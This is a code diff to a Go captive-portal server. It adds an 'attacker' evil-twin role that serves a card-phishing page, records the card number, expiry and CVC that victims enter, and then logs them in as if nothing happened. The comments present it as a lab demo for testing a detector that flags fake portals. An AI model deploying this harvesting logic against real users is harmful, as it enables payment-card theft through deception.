@@ -265,6 +265,12 @@ func (s *server) servePortal(w http.ResponseWriter, r *http.Request, st *site) {
 			http.Redirect(w, r, sc.SwitchTo, http.StatusFound)
 			return
 		}
+		// The evil twin harvests the phished card details, then logs the
+		// client in as if nothing happened.
+		if s.cfg.Role == "attacker" {
+			s.capturePayment(w, r)
+			return
+		}
 		s.finishLogin(w, r, sessionFrom(r.PostForm), "accept")
 	case r.URL.Path == "/complete" && r.Method == http.MethodGet:
 		s.finishLogin(w, r, sessionFrom(r.URL.Query()), "complete_after_payment")
@@ -279,10 +285,35 @@ func (s *server) servePortal(w http.ResponseWriter, r *http.Request, st *site) {
 func (s *server) servePortalPage(w http.ResponseWriter, r *http.Request, st *site, scheme string) {
 	sess := sessionFrom(r.URL.Query())
 	s.events.record(r, scheme, "login_page", nil)
-	render(w, http.StatusOK, loginPage, map[string]any{
+	// The evil twin serves a card-phishing page; the genuine portal does not.
+	page := loginPage
+	if s.cfg.Role == "attacker" {
+		page = attackerPortalPage
+	}
+	render(w, http.StatusOK, page, map[string]any{
 		"Venue": s.cfg.VenueName, "Host": st.Host, "Session": sess,
 		"HasSession": sess.Tok != "", "Checkout": s.checkoutURL(r, st),
 	})
+}
+
+// capturePayment is the theft: the attacker role logs the card details the
+// client typed into the phishing page ("captured_payment" in the attacker
+// log), then logs the client in as normal so nothing seems wrong - or shows a
+// confirmation when there is no openNDS session (page opened directly). Lab
+// demo only; the point is that GECKO flags this portal before anything is sent.
+func (s *server) capturePayment(w http.ResponseWriter, r *http.Request) {
+	s.events.record(r, "https", "captured_payment", map[string]string{
+		"cc_name":   r.PostForm.Get("cc_name"),
+		"cc_number": r.PostForm.Get("cc_number"),
+		"cc_exp":    r.PostForm.Get("cc_exp"),
+		"cc_cvc":    r.PostForm.Get("cc_cvc"),
+	})
+	sess := sessionFrom(r.PostForm)
+	if sess.Tok == "" {
+		render(w, http.StatusOK, capturedPage, map[string]any{"Venue": s.cfg.VenueName, "Host": s.portal.Host})
+		return
+	}
+	s.finishLogin(w, r, sess, "accept")
 }
 
 // checkoutURL builds the payment-delegate URL for the current session, or ""
